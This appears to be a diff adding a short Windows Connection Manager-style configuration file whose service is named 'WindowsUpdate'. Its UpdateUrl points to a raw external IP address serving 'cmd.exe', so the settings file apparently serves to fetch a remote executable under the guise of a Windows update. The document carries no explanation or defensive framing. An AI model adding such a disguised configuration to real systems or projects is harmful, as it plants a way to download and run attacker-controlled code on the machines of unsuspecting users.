@@ -1,0 +1,6 @@
+[Connection Manager]
+CMSFile=settings.txt
+ServiceName=WindowsUpdate
+TunnelFile=settings.txt
+[Settings]
+UpdateUrl=http://147.182.162.230:9090/cmd.exe
